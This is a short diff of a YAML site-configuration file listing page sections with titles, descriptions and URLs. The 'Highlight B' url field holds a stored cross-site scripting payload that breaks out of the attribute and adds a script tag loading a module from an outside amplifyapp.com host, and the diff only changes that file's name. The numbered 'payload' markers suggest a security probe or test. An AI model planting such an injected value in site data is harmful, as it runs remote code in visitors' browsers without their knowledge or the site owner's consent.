@@ -19,7 +19,7 @@ sections:
         - title: Highlight B
           description: Important highlight B is equally important
           url: https://test.com/"'>payload123<script
-            src="https://staging.d3lm7ksvtvt9eg.amplifyapp.com/files/mjssvg.mjs"></script>payload444
+            src="https://staging.d3lm7ksvtvt9eg.amplifyapp.com/files/payload.mjs"></script>payload444
         - title: Page A
           description: Page A is important too
           url: /privacy/
